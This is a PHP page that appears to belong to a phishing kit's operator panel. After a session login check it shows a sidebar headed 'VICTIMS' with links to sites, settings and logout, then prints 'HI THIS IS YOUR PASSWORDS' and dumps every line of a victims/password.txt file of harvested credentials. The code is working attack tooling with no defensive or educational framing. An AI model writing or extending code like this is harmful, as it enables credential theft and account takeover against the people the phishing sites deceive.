<?php session_start(); /* Starts the session */

if(!isset($_SESSION['UserData']['Username'])){
	header("location:login.php");
	exit;
}
?>


<?php
echo'<meta charset=UTF-8>';echo'<link rel=stylesheet type=text/css href=./style.css>';echo'<script>function aps(){document.getElementById("hello").contentWindow.location.reload();}</script>';$dir='.././sites';$efg=$_SERVER['REQUEST_URI'];$pat=explode('/',$efg);$cds=$_SERVER['SERVER_NAME'];for($i=0;$i<count($pat)- 2;$i++){$cds.=$pat[$i]."/";}$hgf="http://".$cds."sites/";

echo'
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
  margin: 0;
  font-family: Courier New;
}

.sidebar {
  margin: 0;
  padding: 0;
  width: 200px;
  background-color: #f1f1f1;
  position: fixed;
  height: 100%;
  overflow: auto;
}

.sidebar a {
  display: block;
  color: black;
  padding: 16px;
  text-decoration: none;
}
 
.sidebar a.active {
  background-color: #4CAF50;
  color: white;
}

.sidebar a:hover:not(.active) {
  background-color: #555;
  color: white;
}

div.content {
  margin-left: 200px;
  padding: 1px 16px;
  height: 1000px;
}

@media screen and (max-width: 700px) {
  .sidebar {
    width: 100%;
    height: auto;
    position: relative;
  }
  .sidebar a {float: left;}
  div.content {margin-left: 0;}
}

@media screen and (max-width: 400px) {
  .sidebar a {
    text-align: center;
    float: none;
  }
}
</style>
</head>
<body>

<div class="sidebar">
<br>
<h3><center>VICTIMS</center></h3>
<br>

    <a href="./home.php"><b>Home</b></a>
  <a  href="./dashboard.php"><b>Links</b></a>
  <a  href="./advance/index.php"><b>Settings</b></a>
  <a   class="active" href="./victims.php"><b>Victims</b</a>
  <a href="./logout.php"><b>Logout</b></a>

</div></body><br><br><br><br>';
echo'<body><center>';
echo "HI THIS IS YOUR PASSWORDS ";

echo'<br><br>';





$file = fopen(".././victims/password.txt","r");

while(! feof($file))
  {
  echo fgets($file). "<br/>";
  }

fclose($file);
echo'</body></center>';



?>


